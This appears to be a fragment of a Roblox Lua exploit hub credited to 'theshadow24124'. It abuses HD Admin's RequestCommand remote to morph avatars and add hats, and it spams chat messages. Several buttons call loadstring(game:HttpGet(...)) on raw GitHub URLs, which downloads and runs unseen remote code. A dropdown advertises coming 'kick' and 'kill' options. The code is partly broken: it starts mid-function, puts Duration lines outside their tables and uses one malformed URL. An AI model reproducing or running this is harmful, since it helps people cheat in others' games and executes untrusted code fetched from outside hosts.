local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";hat me 6869866014"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed;(";
        Text = "locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "coming soon",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("gun", "wait 25 second", function()
local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    local A_1 = ";hat me 5154115297"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
    local A_1 = ";hat me 5154115297"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(2)
    local A_1 = ";hat me 6775268462"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(3)
    local A_1 = ";hat me 9063843256"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(4)
    local A_1 = ";hat me 6238724671"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(5)
    local A_1 = ";hat me 5890459124"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(6)
    local A_1 = ";hat me 10714637110"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(7)
    local A_1 = ";shirt me 6181119500"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(8)
    local A_1 = ";pants me 6471885944"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(9)
    --type here...
game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed;(";
        Text = "locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "coming soon",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("M#O#A", "wait 25 second", function()
local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section8:NewButton("guns in pendulum hub", "wait 25 second", function()
local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
local A_1 = ";hat me 7168302712"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
local A_1 = ";shirt me 9360354124"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(2)
local A_1 = ";pants me 93603395223"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    --type here... stopped at duble guns
game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed;(";
        Text = "locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "coming soon",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("ball", "wait 5 second", function()
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local SPEED_MULTIPLIER = 30
local JUMP_POWER = 60
local JUMP_GAP = 0.3

local character = game.Players.LocalPlayer.Character

for i,v in ipairs(character:GetDescendants()) do
   if v:IsA("BasePart") then
       v.CanCollide = false
   end
end

local ball = character.HumanoidRootPart
ball.Shape = Enum.PartType.Ball
ball.Size = Vector3.new(5,5,5)
local humanoid = character:WaitForChild("Humanoid")
local params = RaycastParams.new()
params.FilterType = Enum.RaycastFilterType.Blacklist
params.FilterDescendantsInstances = {character}

local tc = RunService.RenderStepped:Connect(function(delta)
   ball.CanCollide = true
   humanoid.PlatformStand = true
if UserInputService:GetFocusedTextBox() then return end
if UserInputService:IsKeyDown("W") then
ball.RotVelocity -= Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("A") then
ball.RotVelocity -= Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("S") then
ball.RotVelocity += Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("D") then
ball.RotVelocity += Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
end
--ball.RotVelocity = ball.RotVelocity - Vector3.new(0,ball.RotVelocity.Y/50,0)
end)

UserInputService.JumpRequest:Connect(function()
local result = workspace:Raycast(
ball.Position,
Vector3.new(
0,
-((ball.Size.Y/2)+JUMP_GAP),
0
),
params
)
if result then
ball.Velocity = ball.Velocity + Vector3.new(0,JUMP_POWER,0)
end
end)

Camera.CameraSubject = ball
humanoid.Died:Connect(function() tc:Disconnect() end)
game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "made by theshadow24124,oudgsds",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end) 
Section8:NewButton("big head", "admin,hats,r15", function()
     local A_1 = ";re"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.3)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.6)
     local A_1 = ";hat me 8650976659"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.9)
     local A_1 = ";hat me 7436333515"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";size me 2.7"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/sysGhost-aka-BiKode/Scripts2022/main/BigHeadV3_Unpatched", true))()
game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "made by theshadow24124,oudgsds",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("walk wall broken", "r15,r6", function()
game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed:(";
        Text = "it seem script locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "made by theshadow24124,oudgsds,locked",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("walk wall broken", "r15,r6", function()
local function callback(Text)
 if Text == "Button1 text" then
  print ("thanks!")
elseif Text == ("Button2 text") then
 print ("bnork")
 end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback
--starter
game.StarterGui:SetCore("SendNotification",  {
 Title = "coming soon , update";
 Text = "don' forget to join our discord";
 Icon = "rbxthumb://type=Asset&id=12070397812&w=150&h=150";
 Duration = 22;
 Button1 = "ok";
 Callback = NotificationBindable;
})
--
end)
Section8:NewButton("football", "hats,r6", function()
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.9)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 62234425"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.12)
     local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.16)
     local A_1 = ";hat me 62724852"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.18)
     local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.20)
     local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.22)
     local A_1 = ";hat me 48474313"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.35)
end)
Section8:NewButton("scp monster coming soon", "hats,r6", function()
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.9)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed:(";
        Text = "it seem script locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "made by theshadow24124,oudgsds,locked",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("titan gun coming soon", "hats,r6", function()
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.9)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed:(";
        Text = "it seem script locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "made by theshadow24124,oudgsds,locked",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewButton("vr hands", "hats,r6", function()
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.9)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.12)
     local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.14)
     local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.16)
     local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.18)
     local A_1 = ";hat me 48474313"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.20)
     local A_1 = ";hat me 5230863216"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.22)
     local A_1 = ";hat me 7170689370"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.26)
game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "done";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
        local args = {
    [1] = "made by theshadow24124,oudgsds done",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section8:NewDropdown("coming soon!", "coming soon!", {"kick", "kill", "protect", "...."}, function(currentOption)
    --text here...
end)
Section8:NewButton("SLED 2 reanimated", "locked", function()
     local A_1 = ";char me "
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section8:NewButton("sHaDoW reanimated", "locked", function()
     local A_1 = ";char me "
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section8:NewButton("Friend Fe", "r6,r??", function()
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 48474313"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 62724852"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";bundle me 282"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 4047554959"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 4047554959"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
    --type here
end)
Section8:NewButton("pop cat", "r6,hat", function()
     local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.5)
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 6380246734"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";hat me 6065706256"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.2)
     local A_1 = ";hat me 8337370"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.4)
     local A_1 = ";hat me 48474313"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.6)
     local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.8)
     local A_1 = ";hat me 62724852"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.10)
     local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.12)
     local A_1 = ";hat me 62234425"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.20)
loadstring(game:HttpGet(('https://raw.githubusercontent.com/hacker123454/x/main/Pop_Cat.txt'),true))()
-- E = sit Q = Pop
-- R = Wave
-- T = Punch
-- F = idk
-- G = punch from black
-- Z = yes
-- X = No
end)

local Section9 = ScriptFETab:NewSection("Football fe")

Section9:NewButton("Ball", "r6,hats", function()
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section9:NewButton("reload ball", "reinstall ball", function()
    
end)
Section9:NewButton("delete ball", "remove ball", function()
    
end)

local Section10 = FlagsTap:NewSection("flags arab / R6.HATS")

Section10:NewButton("flag fe don't press me first press your flag", "SYRIA", function()

end)
Section10:NewButton("syria", "SYRIA", function()
     local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.5)
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";shirt me 8565514568"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section10:NewButton("iraq", "IRAQ", function()
     local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.5)
     local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";shirt me 8565514568"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section10:NewButton("saudi", "SAUDI", function()
     local A_1 = ";morph me donal"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";morph me noob1 ;color me black"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     local A_1 = ";shirt me 11948711746"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section10:NewButton("Morocco", "MOROCCO", function()

end)

local Section11 = madebyTab:NewSection("ABOUT theshadow24124 / discord")

Section11:NewButton("the owner script skin", "from syira", function()
     local A_1 = ";char me theshadow24124"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section11:NewButton("discord server", "https://discord.gg/v3ZSthDM", function()
setclipboard("https://discord.gg/v3ZSthDM")
end)
Section11:NewButton("name owner script 2", "copy", function()
setclipboard("theshadow24124,oudsgds,osama3421")
end)
Section11:NewButton("youtube channel", "copy", function()
setclipboard("https://www.youtube.com/@osama_gamer3633/videos")
end)

local Section12 = SCRIPTSMAPTab:NewSection("script maps key & no key")

Section12:NewButton("script maps more", "no key", function()
loadstring(game:HttpGet("[https://github.com/thesshadow24124/knogs-osama-maps/edit/main/README.md](https://raw.githubusercontent.com/thesshadow24124/knogs-osama-maps/main/Knogs%20Osama%20hUB)"))()
end)
